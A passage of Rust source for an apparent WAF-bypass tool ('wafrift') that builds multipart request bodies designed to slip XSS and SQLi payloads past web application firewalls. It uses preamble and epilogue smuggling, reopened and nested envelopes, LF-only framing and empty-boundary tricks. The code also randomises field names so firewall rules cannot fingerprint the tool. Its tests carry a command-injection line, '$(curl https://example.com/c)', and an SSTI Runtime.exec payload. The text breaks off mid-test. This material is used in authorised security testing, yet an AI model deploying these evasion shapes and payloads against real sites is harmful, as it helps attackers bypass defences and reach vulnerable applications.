//! Multipart preamble / epilogue / nested-envelope WAF smuggling.
//!
//! RFC 2046 §5.1.1 defines two regions inside a multipart body that
//! parsers MUST discard: the **preamble** (everything before the first
//! `--<boundary>` delimiter line) and the **epilogue** (everything
//! after the closing `--<boundary>--` line). The standard frames them
//! as "to be ignored" — and that "to be ignored" is exactly the seam
//! WAFs and application servers disagree on.
//!
//! Two parser-divergence families emerge:
//!
//! 1. **Over-inspecting WAFs** scan the *entire* request body as one
//!    flat byte buffer looking for signatures (SQLi, XSS, CMDi). They
//!    treat preamble/epilogue text as part of the body. The origin
//!    server runs a real multipart parser, discards preamble/epilogue,
//!    and never sees the "signature." Net result: the WAF blocks an
//!    otherwise-benign request → false-positive lever the operator can
//!    use as an availability oracle (or, inverted, as a fingerprint
//!    for over-inspecting WAFs).
//!
//! 2. **Under-inspecting WAFs** parse multipart but trust RFC 2046
//!    literally and discard preamble/epilogue. Some lenient origin
//!    parsers (older Werkzeug, certain PHP $_FILES paths, Go
//!    `mime/multipart` without strict `NextPart` semantics) will keep
//!    walking the body and surface a *second* full multipart envelope
//!    hidden in the epilogue. Net result: WAF inspects only the first
//!    envelope (benign), origin reads the second envelope (payload).
//!
//! This module emits a focused set of probes that exercise both
//! families plus three boundary-syntax edge cases the WAFFLED follow-up
//! work (Akhavani et al., IEEE S&P 2025) called out as under-tested:
//! partial-close boundaries, empty-boundary parameters, and CR-only
//! line endings in the delimiter line.
//!
//! All probes reuse [`crate::unique_boundary`] for entropy so the
//! delimiter cannot collide with attacker-controlled values, and all
//! variants are wrapped in the existing [`crate::ContentTypeVariant`]
//! shape so downstream consumers do not need a separate dispatch
//! path.
//!
//! # Example
//!
//! ```
//! use wafrift_content_type::multipart_smuggle::generate_smuggle_variants;
//!
//! let params = vec![
//!     ("user".to_string(), "admin".to_string()),
//!     ("token".to_string(), "' OR 1=1 --".to_string()),
//! ];
//! let variants = generate_smuggle_variants(&params);
//! assert!(variants.len() >= 6, "expect a full sweep of smuggle shapes");
//! for v in &variants {
//!     assert!(!v.body.is_empty());
//!     assert!(v.content_type.starts_with("multipart/"));
//! }
//! ```
//!
//! # Safety
//!
//! Every variant is a **probe**, not an exploit. The smuggled content
//! is the operator's own param set re-formatted — these shapes do not
//! create payloads, they only re-frame what the caller already passed
//! in. The probe value comes from observing the WAF/origin divergence,
//! not from any payload smuggling beyond what the caller authorised.

use crate::ContentTypeTechnique;
use crate::ContentTypeVariant;
use crate::content_type::{build_multipart_body, unique_boundary};
use rand::Rng;

/// Pool of innocuous form-field names used to label internal smuggle
/// parts (e.g. the second envelope of a partial-close-reopen probe,
/// the outer wrapper of a nested envelope). The originals
/// `_wafrift_smuggle_part` and `_wafrift_outer` were trivial
/// signature fingerprints — a WAF rule keyed on
/// `name="_wafrift_*"` would block every multipart smuggle wafrift
/// emits. These names mimic real form-field names found in the wild:
/// CSRF tokens, file inputs, hidden state fields.
pub(crate) const NEUTRAL_FIELD_NAME_POOL: &[&str] = &[
    "csrf_token",
    "authenticity_token",
    "form_data",
    "upload",
    "attachment",
    "file",
    "data",
    "_state",
    "request_id",
    "x-form-token",
];

fn random_field_name() -> String {
    wafrift_types::pick::pick_from(NEUTRAL_FIELD_NAME_POOL, "form_data").to_string()
}

fn random_field_value() -> String {
    // 16-hex-char correlation token — looks like a CSRF/session
    // value to a casual observer; opaque to WAF rules; useful to
    // operators correlating probe responses without leaking
    // wafrift's brand.
    let mut rng = rand::thread_rng();
    (0..16)
        .map(|_| format!("{:x}", rng.gen_range(0..16u8)))
        .collect()
}

/// Maximum bytes wafrift will tag onto the front/back of a multipart
/// body as preamble or epilogue. The probe value here is structural,
/// not size-based: a few hundred bytes is enough to seed any signature
/// scanner. Capping prevents the smuggle pipeline from being abused as
/// a megabyte-amplifier for the proxy front-end.
pub(crate) const MAX_SMUGGLE_REGION_BYTES: usize = 4 * 1024;

/// Caller-controlled per-probe signature payloads.
///
/// Each field is the byte sequence wafrift will embed inside the
/// corresponding region. The default values exercise XSS + SQLi
/// signatures (covering the broadest WAF rule footprint), but
/// operators surveying a specific WAF rule class (CMDi, SSTI,
/// LDAPi, etc.) can substitute the relevant fingerprint without
/// duplicating the rest of the smuggle pipeline.
///
/// Empty regions are valid — passing `b""` produces a structural
/// probe with no signature payload, useful for measuring the
/// pure framing-divergence signal independently of any signature.
#[derive(Debug, Clone)]
pub struct SmuggleProbeConfig {
    /// Bytes inserted before the first `--<boundary>` line. The
    /// default looks like an HTML form prologue with an embedded
    /// `<script>` tag so flat-buffer WAFs trip on the signature
    /// while strict multipart parsers ignore the preamble per RFC
    /// 2046 §5.1.1.
    pub preamble_signature: Vec<u8>,
    /// Bytes inserted after the closing `--<boundary>--` line. The
    /// default carries an SQLi-shaped string so the epilogue probe
    /// covers a different rule class from the preamble probe.
    pub epilogue_signature: Vec<u8>,
}

impl Default for SmuggleProbeConfig {
    fn default() -> Self {
        Self {
            preamble_signature: DEFAULT_PREAMBLE_SIGNATURE.to_vec(),
            epilogue_signature: DEFAULT_EPILOGUE_SIGNATURE.to_vec(),
        }
    }
}

/// Default XSS-shaped preamble signature. Public so callers that want
/// to compose around it (prepend their own bytes, etc.) don't have to
/// reconstruct the canonical shape from the documentation.
pub const DEFAULT_PREAMBLE_SIGNATURE: &[u8] = b"<!doctype html>\r\n\
      <form action=\"/login\"><script>alert(1)</script></form>\r\n\
      This text precedes the first boundary per RFC 2046 \xC2\xA75.1.1 \
      and MUST be ignored by conforming multipart parsers.\r\n";

/// Default SQLi-shaped epilogue signature. Differs from the preamble
/// default by rule class so a single probe sweep exposes both XSS and
/// SQLi divergence in one pass.
pub const DEFAULT_EPILOGUE_SIGNATURE: &[u8] =
    b"\r\nTrailing octets after RFC 2046 closing delimiter. \
      <script>alert(1)</script> \
      union select 1,2,version(),4 from information_schema.tables --\r\n";

/// Build a multipart body with optional preamble bytes prepended and
/// optional epilogue bytes appended. Preamble appears before the first
/// `--<boundary>` line; epilogue appears after the `--<boundary>--`
/// terminator. Both regions are capped at [`MAX_SMUGGLE_REGION_BYTES`]
/// so adversarial callers can't amplify the body without bound.
pub(crate) fn build_with_regions(
    params: &[(String, String)],
    boundary: &str,
    preamble: &[u8],
    epilogue: &[u8],
) -> Vec<u8> {
    let pre_len = preamble.len().min(MAX_SMUGGLE_REGION_BYTES);
    let post_len = epilogue.len().min(MAX_SMUGGLE_REGION_BYTES);
    let core = build_multipart_body(params, boundary);
    let mut out = Vec::with_capacity(pre_len + core.len() + post_len);
    out.extend_from_slice(&preamble[..pre_len]);
    out.extend_from_slice(&core);
    out.extend_from_slice(&epilogue[..post_len]);
    out
}

/// Generate the full sweep of preamble/epilogue/nested smuggle
/// variants. Returns a `Vec` of [`ContentTypeVariant`]s ready to be
/// shipped through the same dispatch path as
/// [`crate::generate_variants`]. The two sets are designed to be
/// concatenated:
///
/// ```ignore
/// let all = [generate_variants(&p), generate_smuggle_variants(&p)].concat();
/// ```
///
/// Each variant tags itself with a [`ContentTypeTechnique`] so
/// telemetry can attribute bypass rate per technique without parsing
/// the description string.
#[must_use]
pub fn generate_smuggle_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant> {
    generate_smuggle_variants_with_config(params, &SmuggleProbeConfig::default())
}

/// Body-level version of [`generate_smuggle_variants`] that takes a
/// caller-supplied [`SmuggleProbeConfig`]. Use this when surveying a
/// specific WAF rule class (CMDi, SSTI, LDAPi) — substitute the
/// appropriate signature bytes for `preamble_signature` /
/// `epilogue_signature` and the rest of the smuggle pipeline (partial
/// close, nested envelope, LF-only delimiters, empty boundary) runs
/// unchanged.
#[must_use]
pub fn generate_smuggle_variants_with_config(
    params: &[(String, String)],
    config: &SmuggleProbeConfig,
) -> Vec<ContentTypeVariant> {
    let mut variants = Vec::new();
    let value_refs: Vec<&str> = params.iter().map(|(_, v)| v.as_str()).collect();

    // 1. Preamble carrying signature-shaped bytes. The preamble looks
    //    like an HTML form prologue so a flat-buffer WAF scanner trips
    //    on the embedded "<script>" without the request actually
    //    containing one in any RFC sense. Origin discards.
    {
        let boundary = unique_boundary(&value_refs);
        let body = build_with_regions(params, &boundary, &config.preamble_signature, b"");
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary={boundary}"),
            body,
            technique: ContentTypeTechnique::MultipartPreambleSmuggle,
            description: "Preamble before first boundary — WAF flat-scans, origin discards".into(),
            canary: wafrift_types::canary::Canary::generate(),
        });
    }

    // 2. Epilogue carrying signature-shaped bytes. Same divergence
    //    inverted: the bytes live AFTER the closing `--boundary--`
    //    line. Some WAFs only inspect up to the close, some inspect
    //    everything; some origins read past the close to find a
    //    Content-Range gap, most stop. The probe surfaces which side
    //    of the disagreement the target sits on.
    {
        let boundary = unique_boundary(&value_refs);
        let body = build_with_regions(params, &boundary, b"", &config.epilogue_signature);
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary={boundary}"),
            body,
            technique: ContentTypeTechnique::MultipartEpilogueSmuggle,
            description:
                "Epilogue after closing boundary — RFC says discard; lenient parsers don't".into(),
            canary: wafrift_types::canary::Canary::generate(),
        });
    }

    // 3. Partial close — terminate the first envelope with the
    //    `--<boundary>--` closer, then immediately open a SECOND copy
    //    of the same boundary as if there were more parts. RFC says
    //    everything past `--boundary--` is epilogue and discarded; a
    //    re-entrant parser keeps walking and emits the smuggled part.
    {
        let boundary = unique_boundary(&value_refs);
        let mut body = build_multipart_body(params, &boundary);
        // Append a fully-formed second multipart envelope as "epilogue"
        // that looks indistinguishable from a continuation to a buggy
        // parser. The second envelope carries the same shape so any
        // smuggle-detector keys on structure, not content.
        // Field name + value are drawn from neutral pools per call
        // (NEUTRAL_FIELD_NAME_POOL) so a WAF rule keyed on
        // `name="_wafrift_*"` cannot pin this smuggle as a wafrift
        // fingerprint.
        let second =
            build_multipart_body(&[(random_field_name(), random_field_value())], &boundary);
        body.extend_from_slice(b"\r\n");
        body.extend_from_slice(&second);
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary={boundary}"),
            body,
            technique: ContentTypeTechnique::MultipartPartialCloseReopen,
            description:
                "Closing boundary then reopened envelope — re-entrant parsers see two messages"
                    .into(),
            canary: wafrift_types::canary::Canary::generate(),
        });
    }

    // 4. Nested envelope inside a single part. The outer part's body
    //    has its own `Content-Type: multipart/mixed; boundary=<inner>`
    //    header and contains a complete inner multipart message. WAFs
    //    that don't recurse miss the inner; strict origin parsers
    //    (Spring, JAX-RS) DO recurse and surface inner fields.
    {
        let outer = unique_boundary(&value_refs);
        let inner_seed: Vec<&str> = value_refs.iter().copied().chain([outer.as_str()]).collect();
        let inner = unique_boundary(&inner_seed);
        let inner_body = build_multipart_body(params, &inner);
        // build_multipart_body emits UTF-8 because params are Strings.
        // Use from_utf8 (strict) rather than from_utf8_lossy so a future
        // change that makes the body non-UTF-8 surfaces loudly instead of
        // silently corrupting the nested envelope content via replacement
        // chars. If the body is somehow non-UTF-8, fall back to a
        // structurally valid but empty inner part rather than emitting
        // replacement-character garbage that corrupts the probe.
        let inner_str = String::from_utf8(inner_body).unwrap_or_else(|_| {
            // Fallback: empty inner body keeps the outer frame valid.
            format!("--{inner}--\r\n")
        });
        // Outer-wrapper field name comes from the neutral pool so
        // it doesn't broadcast a wafrift fingerprint.
        let outer_name = random_field_name();
        let body = format!(
            "--{outer}\r\n\
             Content-Disposition: form-data; name=\"{outer_name}\"\r\n\
             Content-Type: multipart/mixed; boundary={inner}\r\n\r\n\
             {inner_str}\r\n\
             --{outer}--\r\n"
        )
        .into_bytes();
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary={outer}"),
            body,
            technique: ContentTypeTechnique::MultipartNestedEnvelope,
            description:
                "Nested multipart inside a part — non-recursive WAFs miss the inner envelope"
                    .into(),
            canary: wafrift_types::canary::Canary::generate(),
        });
    }

    // 5. CR-only delimiter line endings. RFC 2046 requires CRLF; some
    //    parsers accept bare CR (older Microsoft stacks) or bare LF
    //    (Unix-tolerant parsers). The probe sends LF-only between the
    //    boundary line and the part headers; cross-stack diff exposes
    //    which side accepts the malformed framing.
    {
        let boundary = unique_boundary(&value_refs);
        let mut body = String::new();
        for (key, value) in params {
            // Bare LF separators throughout the part — not just at the
            // delimiter line. Route key/value through the SAME canonical
            // sanitisers the CRLF builder uses (§7 dedup): the name strip
            // removes CR/LF *and* backslash-escapes `\`/`"` per RFC 7578
            // §4.2 so a key containing a quote can't terminate the
            // `name="..."` value early and forge the part header — the
            // earlier hand-rolled `replace(['\r','\n'], "")` here missed
            // the quote-escape the shared builder already performs. The
            // value sanitiser strips CR/LF only (body section is
            // transparent to quotes), keeping the intentional bare-LF
            // framing free of stray newlines from attacker-supplied data.
            let safe_k = crate::content_type::safe_multipart_name(key);
            let safe_v = crate::content_type::safe_multipart_value(value);
            body.push_str(&format!(
                "--{boundary}\n\
                 Content-Disposition: form-data; name=\"{safe_k}\"\n\n\
                 {safe_v}\n"
            ));
        }
        body.push_str(&format!("--{boundary}--\n"));
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary={boundary}"),
            body: body.into_bytes(),
            technique: ContentTypeTechnique::MultipartLfOnlyDelimiters,
            description: "LF-only delimiters — non-CRLF framing splits WAF vs Unix-tolerant origin"
                .into(),
            canary: wafrift_types::canary::Canary::generate(),
        });
    }

    // 6. Empty boundary parameter. RFC 2046 requires 1..=70 chars;
    //    some parsers accept the empty string and fall back to a
    //    parser-internal default; others reject the whole header. The
    //    probe carries a *real* boundary in the body and the empty one
    //    in the Content-Type header — the WAF takes the empty default,
    //    sees no parts, lets the request through. Origin sees the
    //    intended frame because it auto-detected the real boundary.
    {
        let real = unique_boundary(&value_refs);
        let body = build_multipart_body(params, &real);
        variants.push(ContentTypeVariant {
            content_type: "multipart/form-data; boundary=".into(),
            body,
            technique: ContentTypeTechnique::MultipartEmptyBoundaryParam,
            description: "Empty boundary parameter — WAF fails parse, lenient origin auto-detects"
                .into(),
            canary: wafrift_types::canary::Canary::generate(),
        });
    }

    variants
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ContentTypeTechnique;

    fn sample_params() -> Vec<(String, String)> {
        vec![
            ("user".to_string(), "admin".to_string()),
            ("query".to_string(), "' OR 1=1 --".to_string()),
        ]
    }

    #[test]
    fn generate_emits_six_distinct_variants() {
        // §12 TESTING — pin the variant count so any silent re-tuning
        // (a technique removed during refactor) breaks the build.
        // Anti-rig: if someone "shrinks" the set without updating this
        // assertion, the test surfaces the change immediately.
        let v = generate_smuggle_variants(&sample_params());
        assert_eq!(v.len(), 6, "smuggle sweep must emit exactly 6 shapes");

        let techniques: std::collections::HashSet<_> =
            v.iter().map(|x| x.technique.clone()).collect();
        assert_eq!(
            techniques.len(),
            6,
            "each variant must claim a distinct technique tag"
        );
    }

    #[test]
    fn every_variant_carries_a_content_type_and_nonempty_body() {
        for v in generate_smuggle_variants(&sample_params()) {
            assert!(
                v.content_type.starts_with("multipart/"),
                "variant {:?} must declare multipart/* Content-Type, got {:?}",
                v.technique,
                v.content_type
            );
            assert!(
                !v.body.is_empty(),
                "variant {:?} produced empty body",
                v.technique
            );
        }
    }

    #[test]
    fn preamble_variant_places_payload_before_first_boundary() {
        let v = generate_smuggle_variants(&sample_params());
        let preamble = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartPreambleSmuggle)
            .expect("preamble variant present");
        let body_str = std::str::from_utf8(&preamble.body).expect("utf-8 body");
        let first_boundary = body_str.find("\r\n--").expect("body has boundary");
        let script_pos = body_str.find("<script>").expect("preamble contains script");
        assert!(
            script_pos < first_boundary,
            "preamble payload (offset {script_pos}) must precede first boundary (offset {first_boundary})"
        );
    }

    #[test]
    fn epilogue_variant_places_payload_after_closing_boundary() {
        let v = generate_smuggle_variants(&sample_params());
        let epilogue = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartEpilogueSmuggle)
            .expect("epilogue variant present");
        let body_str = std::str::from_utf8(&epilogue.body).expect("utf-8 body");
        let closing_pos = body_str.find("--\r\n").expect("body has closing");
        let payload_pos = body_str
            .find("union select")
            .expect("epilogue contains SQLi-shaped payload");
        assert!(
            payload_pos > closing_pos,
            "epilogue payload (offset {payload_pos}) must follow closing boundary (offset {closing_pos})"
        );
    }

    #[test]
    fn partial_close_reopen_contains_two_envelope_terminators() {
        let v = generate_smuggle_variants(&sample_params());
        let pc = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartPartialCloseReopen)
            .expect("partial-close variant present");
        let body_str = std::str::from_utf8(&pc.body).expect("utf-8 body");
        let closes: Vec<_> = body_str.match_indices("--\r\n").collect();
        assert!(
            closes.len() >= 2,
            "partial-close variant must contain two closing delimiters, found {}",
            closes.len()
        );
    }

    #[test]
    fn nested_envelope_contains_inner_content_type_header() {
        let v = generate_smuggle_variants(&sample_params());
        let nested = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartNestedEnvelope)
            .expect("nested variant present");
        let body_str = std::str::from_utf8(&nested.body).expect("utf-8 body");
        assert!(
            body_str.contains("Content-Type: multipart/mixed"),
            "nested envelope must declare inner multipart/mixed Content-Type"
        );
    }

    #[test]
    fn lf_only_variant_has_no_carriage_returns_in_framing() {
        let v = generate_smuggle_variants(&sample_params());
        let lf = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartLfOnlyDelimiters)
            .expect("LF-only variant present");
        // The variant intentionally omits CR; any \r in the body means
        // the framing leaked CRLF and the divergence probe is muted.
        assert!(
            !lf.body.contains(&b'\r'),
            "LF-only variant must contain zero CR bytes — found in framing"
        );
    }

    #[test]
    fn empty_boundary_param_has_real_boundary_in_body() {
        let v = generate_smuggle_variants(&sample_params());
        let eb = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartEmptyBoundaryParam)
            .expect("empty-boundary variant present");
        assert!(
            eb.content_type.ends_with("boundary="),
            "Content-Type must end with bare 'boundary=' (empty value), got {:?}",
            eb.content_type
        );
        // Body still needs a real boundary or the divergence collapses
        // (origin auto-detect needs *something* to lock onto). The
        // boundary prefix is randomised per call from the neutral
        // pool, so assert via the pool rather than a literal brand.
        let body_str = std::str::from_utf8(&eb.body).expect("utf-8 body");
        assert!(
            crate::content_type::NEUTRAL_BOUNDARY_PREFIXES
                .iter()
                .any(|p| body_str.contains(p)),
            "body must carry a real boundary (one of the neutral-pool prefixes) even when CT header has empty boundary param: got {body_str:?}"
        );
    }

    #[test]
    fn empty_param_list_does_not_panic() {
        // Boundary: empty input. RFC §12 — every behaviour gets a test.
        let v = generate_smuggle_variants(&[]);
        assert_eq!(
            v.len(),
            6,
            "shape count is independent of input cardinality"
        );
        for x in &v {
            assert!(
                !x.body.is_empty(),
                "even empty params produce a framed body"
            );
        }
    }

    #[test]
    fn build_with_regions_caps_each_region_independently() {
        // Anti-rig: a future "optimisation" that merges the two caps
        // into one shared budget would let a giant preamble starve
        // the epilogue (or vice versa). Pin them as independent.
        let huge_pre = vec![b'A'; MAX_SMUGGLE_REGION_BYTES * 3];
        let huge_post = vec![b'B'; MAX_SMUGGLE_REGION_BYTES * 3];
        let out = build_with_regions(&sample_params(), "x", &huge_pre, &huge_post);
        let a_count = out.iter().filter(|&&b| b == b'A').count();
        let b_count = out.iter().filter(|&&b| b == b'B').count();
        assert_eq!(
            a_count, MAX_SMUGGLE_REGION_BYTES,
            "preamble capped at MAX_SMUGGLE_REGION_BYTES independently of epilogue"
        );
        assert_eq!(
            b_count, MAX_SMUGGLE_REGION_BYTES,
            "epilogue capped at MAX_SMUGGLE_REGION_BYTES independently of preamble"
        );
    }

    #[test]
    fn build_with_regions_zero_regions_produces_pure_multipart() {
        // The wrapper must reduce to plain build_multipart_body when
        // both regions are empty — otherwise downstream callers that
        // share a code path with the plain builder see surprise bytes.
        let core = build_multipart_body(&sample_params(), "x");
        let wrapped = build_with_regions(&sample_params(), "x", b"", b"");
        assert_eq!(
            wrapped, core,
            "with empty regions the wrapper output must equal the plain builder"
        );
    }

    #[test]
    fn with_config_substitutes_caller_supplied_signature() {
        // The whole point of `generate_smuggle_variants_with_config`:
        // operators surveying a specific WAF rule class (CMDi here)
        // pick the fingerprint. Default XSS+SQLi bytes must NOT
        // appear; caller's bytes MUST appear.
        let cmdi = b"$(curl https://example.com/c)";
        let ssti = b"{{7*7}}${T(Runtime).getRuntime().exec('id')}";
        let config = SmuggleProbeConfig {
            preamble_signature: cmdi.to_vec(),
            epilogue_signature: ssti.to_vec(),
        };
        let v = generate_smuggle_variants_with_config(&sample_params(), &config);

        let preamble = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartPreambleSmuggle)
            .expect("preamble variant present");
        assert!(
            preamble.body.windows(cmdi.len()).any(|w| w == cmdi),
            "caller-supplied CMDi bytes must appear in preamble body"
        );
        assert!(
            !preamble
                .body
                .windows(b"alert(1)".len())
                .any(|w| w == b"alert(1)"),
            "default XSS bytes must NOT leak when caller supplied CMDi"
        );

        let epilogue = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartEpilogueSmuggle)
            .expect("epilogue variant present");
        assert!(
            epilogue.body.windows(ssti.len()).any(|w| w == ssti),
            "caller-supplied SSTI bytes must appear in epilogue body"
        );
    }

    #[test]
    fn empty_signatures_produce_pure_structural_probes() {
        // Boundary test: empty config drops the signature payload
        // entirely. Useful for measuring framing-only divergence
        // independently of any signature.
        let config = SmuggleProbeConfig {
            preamble_signature: Vec::new(),
            epilogue_signature: Vec::new(),
        };
        let v = generate_smuggle_variants_with_config(&sample_params(), &config);
        let preamble = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartPreambleSmuggle)
            .unwrap();
        // With empty signature, the preamble variant reduces to a
        // plain multipart body — no `<script>`, no `union select`.
        assert!(!preamble.body.windows(8).any(|w| w == b"<script>"));
    }

    #[test]
    fn partial_close_reopen_uses_neutral_field_name_not_wafrift_brand() {
        // Anti-rig: the post-close-reopen envelope's field name must
        // come from NEUTRAL_FIELD_NAME_POOL. A regression that
        // hardcodes "_wafrift_smuggle_part" again would re-introduce
        // the signature fingerprint.
        let v = generate_smuggle_variants(&sample_params());
        let pc = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartPartialCloseReopen)
            .expect("partial-close variant present");
        let body_str = String::from_utf8_lossy(&pc.body);
        assert!(
            !body_str.contains("_wafrift_smuggle_part"),
            "partial-close-reopen field name must not advertise wafrift brand"
        );
        // At least one pool entry must appear as a field name in the
        // body (the second envelope's part name).
        assert!(
            NEUTRAL_FIELD_NAME_POOL
                .iter()
                .any(|name| body_str.contains(&format!("name=\"{name}\""))),
            "partial-close-reopen must label its part with a NEUTRAL_FIELD_NAME_POOL entry: {body_str}"
        );
    }

    #[test]
    fn nested_envelope_uses_neutral_field_name_not_wafrift_brand() {
        let v = generate_smuggle_variants(&sample_params());
        let ne = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartNestedEnvelope)
            .expect("nested variant present");
        let body_str = String::from_utf8_lossy(&ne.body);
        assert!(
            !body_str.contains("_wafrift_outer"),
            "nested envelope outer-wrapper name must not advertise wafrift brand"
        );
        assert!(
            NEUTRAL_FIELD_NAME_POOL
                .iter()
                .any(|name| body_str.contains(&format!("name=\"{name}\""))),
            "nested envelope must label its outer wrapper with a NEUTRAL_FIELD_NAME_POOL entry"
        );
    }

    #[test]
    fn neutral_field_name_pool_has_no_brand_leakage() {
        // Anti-rig: pool entries themselves must not contain "wafrift"
        // or other brand markers. A regression that adds a branded
        // entry would re-introduce the signature surface.
        for &name in NEUTRAL_FIELD_NAME_POOL {
            assert!(
                !name.to_lowercase().contains("wafrift"),
                "NEUTRAL_FIELD_NAME_POOL entry {name:?} leaks brand"
            );
        }
    }

    #[test]
    fn default_config_matches_documented_signature_constants() {
        // §10 COHERENCE — the published `DEFAULT_PREAMBLE_SIGNATURE`
        // and `DEFAULT_EPILOGUE_SIGNATURE` constants ARE what
        // `SmuggleProbeConfig::default()` emits. A regression that
        // forgets to keep them in sync would silently fork the
        // documented bytes from the actual probe bytes.
        let c = SmuggleProbeConfig::default();
        assert_eq!(c.preamble_signature, DEFAULT_PREAMBLE_SIGNATURE);
        assert_eq!(c.epilogue_signature, DEFAULT_EPILOGUE_SIGNATURE);
    }

    #[test]
    fn generate_all_variants_interleaves_so_first_n_covers_both_sets() {
        // §9 WIRING anti-rig: bench-waf default cap is 5 variants. If
        // generate_all_variants concatenated (WAFFLED first, smuggle
        // last), the smuggle shapes would be dark by default. Pin the
        // interleave so any future "optimisation" that reverts to
        // concat breaks here.
        let v = crate::generate_all_variants(&sample_params());
        let first_five = &v[..5.min(v.len())];
        let waffled = first_five
            .iter()
            .filter(|x| {
                matches!(
                    x.technique,
                    ContentTypeTechnique::Multipart
                        | ContentTypeTechnique::MultipartQuotedBoundary
                        | ContentTypeTechnique::MultipartWhitespaceBoundary
                        | ContentTypeTechnique::MultipartCharsetPrefix
                        | ContentTypeTechnique::MultipartDuplicateBoundary
                        | ContentTypeTechnique::JsonUnicodeEscape
                        | ContentTypeTechnique::JsonWithComments
                        | ContentTypeTechnique::XmlCdata
                        | ContentTypeTechnique::XmlNamespace
                        | ContentTypeTechnique::MixedContentType
                        | ContentTypeTechnique::MultipartCharsetEarlySection
                        | ContentTypeTechnique::JsonDuplicateKey
                        | ContentTypeTechnique::MultipartFilenameStarEncoded
                        | ContentTypeTechnique::MultipartDuplicatePartHeader
                )
            })
            .count();
        let smuggle = first_five
            .iter()
            .filter(|x| {
                matches!(
                    x.technique,
                    ContentTypeTechnique::MultipartPreambleSmuggle
                        | ContentTypeTechnique::MultipartEpilogueSmuggle
                        | ContentTypeTechnique::MultipartPartialCloseReopen
                        | ContentTypeTechnique::MultipartNestedEnvelope
                        | ContentTypeTechnique::MultipartLfOnlyDelimiters
                        | ContentTypeTechnique::MultipartEmptyBoundaryParam
                )
            })
            .count();
        assert!(
            waffled >= 1 && smuggle >= 1,
            "first 5 variants must include >=1 from each set: waffled={waffled} smuggle={smuggle}"
        );
    }

    #[test]
    fn generate_all_variants_preserves_full_cardinality() {
        // Interleaving must not lose variants — the union of the two
        // sets must equal the count of generate_all_variants. Anti-rig
        // for any future "dedup by technique" that silently drops one.
        let primary_len = crate::generate_variants(&sample_params()).len();
        let smuggle_len = generate_smuggle_variants(&sample_params()).len();
        let all_len = crate::generate_all_variants(&sample_params()).len();
        assert_eq!(
            all_len,
            primary_len + smuggle_len,
            "interleave must preserve all variants: {primary_len} + {smuggle_len} != {all_len}"
        );
    }

    #[test]
    fn boundaries_are_collision_free_with_supplied_values() {
        // Anti-rig: prove every variant's boundary is RNG-derived and
        // does NOT appear as a substring inside the param values. A
        // regression where someone hardcodes a fixed boundary string
        // would be silently exploitable.
        let params = vec![
            ("evil".to_string(), "----WafriftBoundary000000".to_string()),
            ("again".to_string(), "WafriftBoundarydeadbeef".to_string()),
        ];
        let v = generate_smuggle_variants(&params);
        for variant in &v {
            // Extract every boundary= occurrence from the CT header
            // (there may be one or zero — empty-boundary-param variant
            // has the empty form).
            for token in variant.content_type.split(';') {
                let token = token.trim();
                if let Some(b) = token.strip_prefix("boundary=") {
                    let b = b.trim_matches('"');
                    if b.is_empty() {
                        continue;
                    }
                    let needle = format!("--{b}");
                    assert!(
                        !params.iter().any(|(_, v)| v.contains(&needle)),
                        "boundary {b:?} collides with attacker-supplied value"
                    );
                }
            }
        }
    }

    // ── NEW TESTS ─────────────────────────────────────────────────────────

    #[test]
    fn build_with_regions_at_exact_cap_does_not_truncate() {
        // Boundary: input exactly at the cap must pass through unchanged.
        let exact_pre = vec![b'P'; MAX_SMUGGLE_REGION_BYTES];
        let exact_post = vec![b'Q'; MAX_SMUGGLE_REGION_BYTES];
        let out = build_with_regions(&sample_params(), "bnd", &exact_pre, &exact_post);
        let p_count = out.iter().filter(|&&b| b == b'P').count();
        let q_count = out.iter().filter(|&&b| b == b'Q').count();
        assert_eq!(
            p_count, MAX_SMUGGLE_REGION_BYTES,
            "preamble at exact cap must not be truncated"
        );
        assert_eq!(
            q_count, MAX_SMUGGLE_REGION_BYTES,
            "epilogue at exact cap must not be truncated"
        );
    }

    #[test]
    fn build_with_regions_one_past_cap_truncates_to_cap() {
        // One-past-max: input of cap+1 must clamp to cap bytes, not panic.
        let over_pre = vec![b'P'; MAX_SMUGGLE_REGION_BYTES + 1];
        let over_post = vec![b'Q'; MAX_SMUGGLE_REGION_BYTES + 1];
        let out = build_with_regions(&sample_params(), "bnd", &over_pre, &over_post);
        let p_count = out.iter().filter(|&&b| b == b'P').count();
        let q_count = out.iter().filter(|&&b| b == b'Q').count();
        assert_eq!(
            p_count, MAX_SMUGGLE_REGION_BYTES,
            "preamble one-past-cap must clamp to MAX_SMUGGLE_REGION_BYTES"
        );
        assert_eq!(
            q_count, MAX_SMUGGLE_REGION_BYTES,
            "epilogue one-past-cap must clamp to MAX_SMUGGLE_REGION_BYTES"
        );
    }

    #[test]
    fn single_param_produces_valid_multipart_structure() {
        // Regression: single-field params must still emit a proper
        // boundary-delimited structure in every smuggle shape.
        let params = vec![("key".to_string(), "val".to_string())];
        let v = generate_smuggle_variants(&params);
        assert_eq!(v.len(), 6);
        for variant in &v {
            assert!(!variant.body.is_empty());
            assert!(variant.content_type.starts_with("multipart/"));
        }
    }

    #[test]
    fn concurrent_generation_no_panics_and_distinct_bodies() {
        // §12 TESTING — concurrent: 50 threads each call
        // generate_smuggle_variants independently; all must succeed and
        // no two preamble-variant bodies must be identical (the
        // per-call boundary RNG guarantees this property).
        use std::collections::HashSet;
        use std::sync::{Arc, Mutex};
        use std::thread;

        let bodies: Arc<Mutex<HashSet<Vec<u8>>>> = Arc::new(Mutex::new(HashSet::new()));
